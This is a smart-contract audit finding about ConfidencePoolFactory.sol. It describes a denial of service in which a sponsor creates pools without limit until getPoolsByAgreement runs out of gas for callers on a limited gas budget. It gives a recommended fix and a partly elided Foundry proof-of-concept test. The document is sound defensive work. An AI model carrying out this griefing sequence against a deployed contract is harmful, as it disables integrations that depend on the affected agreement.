### Title
Unbounded `_poolsByAgreement` array enables sponsor-triggered OOG DoS of `getPoolsByAgreement` in gas-constrained on-chain contexts — (File: src/ConfidencePoolFactory.sol)

### Summary
`createPool` imposes no per-agreement pool cap, so a pool sponsor (agreement owner) can push an unbounded number of entries into `_poolsByAgreement[agreement]`. `getPoolsByAgreement` returns the entire array from storage with no pagination or gas guard. Once N is large enough, any on-chain caller invoking it inside a gas-constrained context (e.g., a callback forwarding ~100,000 gas) will OOG-revert, permanently DoS-ing that integration for the affected agreement.

### Finding Description
**Root cause — two cooperating defects in `ConfidencePoolFactory.sol`:**

1. **No per-agreement pool cap in `createPool`** (lines 67–114). The only guards are: non-zero addresses, allowlisted stake token, `expiry ≥ block.timestamp + 30 days`, valid agreement, and `msg.sender == agreement.owner()`. None of these limit how many times the same sponsor may call `createPool` for the same agreement. Each successful call appends one entry to `_poolsByAgreement[agreement]` (line 103).

2. **Unbounded storage array returned by `getPoolsByAgreement`** (lines 117–119):
   ```solidity
   function getPoolsByAgreement(address agreement) external view returns (address[] memory) {
       return _poolsByAgreement[agreement];
   }
   ```
   This performs one cold SLOAD for the array length and one cold SLOAD per element (EIP-2929: 2,100 gas each), plus linear memory allocation and ABI encoding. There is no pagination, no gas check, and no cap.

**Reachable sequence:**
1. Sponsor owns a valid agreement; factory owner has allowlisted at least one token (normal operational state — without this the protocol cannot be used at all).
2. Sponsor calls `createPool(agreement, allowedToken, expiry, 0, recovery, [])` N times, each with a valid `expiry ≥ now + 30 days`. Each call succeeds and pushes one address into `_poolsByAgreement[agreement]`.
3. Any on-chain contract that subsequently calls `factory.getPoolsByAgreement{gas: 100_000}(agreement)` OOG-reverts.

**Gas threshold (cold storage, EIP-2929):**
- Array length SLOAD: 2,100 gas
- Per-element SLOAD: 2,100 gas
- Memory allocation + ABI encoding overhead: ~500–1,000 gas per element
- At 100,000 gas budget: threshold N ≈ **37–45 pools** before OOG

Pools cannot be removed from `_poolsByAgreement`; the DoS is permanent once the threshold is crossed.

**Existing guards are insufficient:** `poolCountByAgreement` (line 122–124) is a separate view that returns only the length and is unaffected, but it does not protect callers of `getPoolsByAgreement`. No check in either function limits array growth or enforces a gas floor.

### Impact Explanation
Any on-chain integration that calls `getPoolsByAgreement` inside a gas-constrained context — a callback, a `try/catch` with forwarded gas, a multicall aggregator, or any contract that budgets gas per external call — will permanently revert for the affected agreement once N exceeds the threshold. The DoS is irreversible (no pool-removal path exists) and scoped to the agreement the sponsor targeted. The core protocol (staking, claiming, resolution) is unaffected, but the factory's own enumeration API becomes permanently unusable for that agreement.

### Likelihood Explanation
The sponsor is an unprivileged actor (agreement owner) who needs only a valid agreement and one allowlisted token — both are standard operational prerequisites. Creating ~40–50 pools costs gas (clone deployment + initialization per call) but is economically feasible, especially on a low-fee EVM-compatible L2 like BattleChain. The attack is one-time and permanent; no ongoing cost is required after the threshold is reached. The sponsor may have a griefing motive (e.g., to disable a competing aggregator or indexer that relies on `getPoolsByAgreement` on-chain).

### Recommendation
Add a per-agreement pool cap enforced inside `createPool`:

```solidity
uint256 private constant MAX_POOLS_PER_AGREEMENT = 20; // tune to gas budget

function createPool(...) external whenNotPaused returns (address pool) {
    ...
    if (_poolsByAgreement[agreement].length >= MAX_POOLS_PER_AGREEMENT)
        revert TooManyPoolsForAgreement();
    ...
}
```

Alternatively (or additionally), add paginated access alongside the existing full-array getter:

```solidity
function getPoolsByAgreement(address agreement, uint256 offset, uint256 limit)
    external view returns (address[] memory page) { ... }
```

A hard cap is the stronger fix because it bounds the array at write time and protects all callers regardless of gas budget.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {ConfidencePoolFactory} from "src/ConfidencePoolFactory.sol";
// ... standard test setup imports

contract PoolConsumer {
    IConfidencePoolFactory public factory;
    constructor(address f) { factory = IConfidencePoolFactory(f); }

    // Simulates a callback or integration with a capped gas budget
    function process(address agreement) external returns (address[] memory) {
        // Forward only 100_000 gas — realistic for a callback context
        return factory.getPoolsByAgreement{gas: 100_000}(agreement);
    }
}

contract GetPoolsByAgreementDoSTest is Test {
    ConfidencePoolFactory factory;
    PoolConsumer consumer;
    address sponsor;
    address agreement;
    address stakeToken;

    function setUp() public {
        // Deploy factory, mock registry, mock agreement owned by `sponsor`,
        // allowlist `stakeToken`, deploy PoolConsumer
        // ... (standard fixture setup)
    }

    function test_OOG_after_N_pools() public {
        uint256 N = 50; // expected to exceed threshold
        vm.startPrank(sponsor);
        for (uint256 i = 0; i < N; i++) {
            factory.createPool(
                agreement,
                stakeToken,
                block.timestamp + 31 days,
                0,
                sponsor,
                new address[](0)
            );
        }
        vm.stopPrank();

        // Assert: getPoolsByAgreement with 100_000 gas reverts (OOG)
        vm.expectRevert(); // OOG causes revert in the consumer
        consumer.process(agreement);

        // Confirm the array actually has N entries (state is intact, only view is broken)
        assertEq(factory.poolCountByAgreement(agreement), N);
    }

    function test_threshold_N() public {
        // Binary search or linear scan to find exact N where process() first reverts
        for (uint256 n = 1; n <= 60; n++) {
            vm.prank(sponsor);
            factory.createPool(agreement, stakeToken, block.timestamp + 31 days, 0, sponsor, new address[](0));
            bool success;
            try consumer.process(agreement) returns (address[] memory) {
                success = true;
            } catch {
                success = false;
            }
            if (!success) {
                emit log_named_uint("OOG threshold N", n);
                // Assert threshold is within the economically feasible range
                assertLt(n, 50);
                return;
            }
        }
        fail(); // Should have OOG'd before 60 pools
    }
}
```

**Decisive assertions:**
- `vm.expectRevert()` on `consumer.process(agreement)` after N pools confirms OOG.
- `assertEq(factory.poolCountByAgreement(agreement), N)` confirms the array grew without bound.
- `assertLt(threshold_N, 50)` confirms the attack is economically feasible on a low-fee L2.